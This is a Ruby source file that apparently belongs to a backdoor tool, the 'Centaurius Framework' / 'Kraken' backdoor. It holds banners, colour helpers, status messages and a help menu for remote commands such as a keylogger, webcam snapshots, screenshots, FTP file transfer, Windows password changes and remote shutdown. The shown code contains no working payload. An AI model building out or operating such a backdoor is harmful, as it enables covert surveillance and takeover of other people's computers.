class String

	def red; "\e[31m#{self}\e[0m" end
	def megenta; "\e[35m#{self}\e[0m" end 




end

module Design



	class Design

		attr_accessor :banners

		public 

		def asciiMain
			self.banners = ["banner1.txt", "banner2.txt", "banner3.txt", "banner4.txt", "banner5.txt", "banner6.txt", "banner7.txt", "banner8.txt", "banner9.txt", "banner10.txt"]
			bannner = File.open("banner/#{self.banners[rand(0..9)]}").read
			return self.randColor(bannner)
		end

		def randColor(string)
			colors = ["#{string}","\033[1;91m#{string}\033[00m", "\033[1;93m#{string}\e[00m"]
			color = colors[rand(0..2)]
		end


        def Copyright
            version = "0.1"
            site = "http://centaurius.net"
            github_site = "https://github.com/Centaurius/Centaurius_Framework"
			puts ""
            puts "      ------====== \033[1;91mCentaurius Framework\033[00m ======------  "
            puts "             Version : \033[1;91m#{version}\033[00m"
            puts "             Website : \033[1;91m#{site}\033[00m"
            puts "             Github  : \033[1;91m#{github_site}\033[00m"
			puts ""

			#puts "#{self.randColor("----------=[")} #{self.randColor("Welcome To Centaurius Framework")} #{self.randColor("]=----------")}"
			puts ""
			unamed = "Unamed".yellow
            muhamRB = "Muham RB".red
            kezua = "Kezua".blue
            prax = "Prax".green
			puts "     Framework has been dev by  \n        [ #{unamed} - #{muhamRB} - #{kezua} - #{prax} ]"
			puts ""
		end

		def input(string)
			print(string)
			cmd = gets.chomp
			return cmd

        end
        
        def infoLog(host, port, ftphost, ftpport, ftpuser, ftppass, ftppath)
            puts "---------------[ #{"show infos".blue} ]---------------"
            puts "HOST: => \t\t#{"#{host}".blue}"
            puts "PORT: => \t\t#{"#{port}".blue}"
            puts "FTPHOST: => \t\t#{"#{ftphost}".blue}"
            puts "FTPPORT: => \t\t#{"#{ftpport}".blue}"
            puts "FTPUSER: => \t\t#{"#{ftpuser}".blue}"
            puts "FTPPASS: => \t\t#{"#{ftppass}".blue}"
            puts "FTPPATH: => \t\t#{"#{ftppath}".blue}"
            puts "------------------------------------------------------"

        end

		def inListen(host, port)
			return self.randColor("[*] Listening #{host} port #{port}")
        end

        def connectFTP(ftphost, ftpport)
            return "[+] FTP SERVER Started on #{ftphost} port #{ftpport}"
        end

		def sessionCreate(rhost, rport)
			return self.randColor("[*] Session create to #{rhost} port #{rport}")

		end

		def help
			puts("             		 [ #{self.randColor("Backdoor - Kraken By Unamed")} ] ")
			puts ""
            puts(' commands               			descriptions                                           compatible-platform')
            puts(' --------               			------------                                         -------------------')
            puts('   help                   		Show Help                                                  multi')
            puts('   quit                   		Quit Backdoor                                              multi')
            puts('   ipgeo                  		IPGeo Target                                               multi')
            puts('   sysinfo                		System Info                                                multi')
            puts('   pwd                    		Show Current Path                                          multi')
            puts('   cd <path>              		Change Dirrectory                                          multi')
            puts('   cat <filename>         		Show Filename                                              multi')
            puts('   portscan <ip>          		Scan Port On Target Machine Network                        multi')
            puts('   del <file>             		Delete File                                                multi')
            puts('   rmpt <path>            		Remove Path Or Folder                                      multi')
            puts('   mkpa <path>            		Create Path Or Folder                                      multi')
            puts('   rname <old> <new>      		Rename File Or Path                                        multi')
            puts('   move  <old> <new>      		Move File Or Folder                                        multi')
            puts('   copy  <old> <new>      		Copy File Or Folder                                        multi')
            puts('   xorencode <filename>   		Encode Xor File                                            multi')
            puts('   b64encode  <file>      		Encode File In Base64                                      multi')
            puts('   b64decode  <file>      		Decode File In Base64                                      multi')
            puts('   keylogger_start        		Start Keylogger                                            multi')
            puts('   keylogger_dump         		Dump Keylogger Log                                         multi')
            puts('   keylogger_stop         		Stop Keylogger                                             multi')
           	puts('   openurl <link>         		Open URL On Target Machine                                 multi')
            puts('   ftpdownload <file>     		Download File With FTP                                     multi')
            puts('   ftpupload   <file>     		Upload File With FTP                                       multi')
            puts('   webcamsnap             		Take A Webcam Snap                                         multi')
           	puts('   screenshot             		Take ScreenShot                                            multi')
            puts('   cwpasswd <users> <new_passwd> 	If Not Know User enter %UserName% Change Win Passwd windows')
            puts('   netuser                		Get Windows User List                                      windows')
            puts('   tkill  <proc_name>     		Kill Process                                               multi')
            puts('   reboot                 		Reboot Machine                                             multi')
            puts('   shutdown               		Shutdown Machine                                           multi')
            puts('   ps                     		Show Tasklist Of The Machine                               multi')
            puts('   clear                  		Clear Console                                              multi')
            puts('   ls                     		List Dirrectory                                            multi')
            puts('   dir                    		List Dirrectory                                            multi')
            puts('   whoami                 		Get Whoami                                                 multi')
            puts('   ifconfig               		Get Ifconfig                                               multi')
            puts('   msgbox                 		Sent Message Box                                           windows')
            puts('   meslp                 		Sent Message Loop                                          windows')
            puts('   resettime              		Reset Time                                                 windows')
            puts('   getpid                 		Return PID                                                 multi')
            puts('   getgtw                 		Return Gateway                                             multi')
            puts('   scan_n_dump            		Return Host Connected (execute this after scan Netxork)    multi')
            puts('   process                		Start Task Process exemple (firefox.exe) etc..             multi')
            puts('	opendiskloop 				Open CD/DVD DISK In Loop                                   Windows')
            puts('   odisk                          Open CD/DVD Disk And Close                                 Windows')

        end

        def BufferShowInfos(pathFile, buffer, function_name, cat=false)
            puts "=======================[ Show infos ]=======================".green
            puts "path file => #{pathFile}"
            puts "Buffer => #{buffer}"
            puts "Fonction => #{function_name}"
            puts "cat => #{cat}"
            puts "============================================================".green

        end
        
        def error
            puts "-----------[ ERROR ]-----------".red
            yield
            puts "-------------------------------".red
        end

        def inf
            puts "------------[ ADDED ]------------".blue
            yield
            puts "---------------------------------".blue
        end



	end
end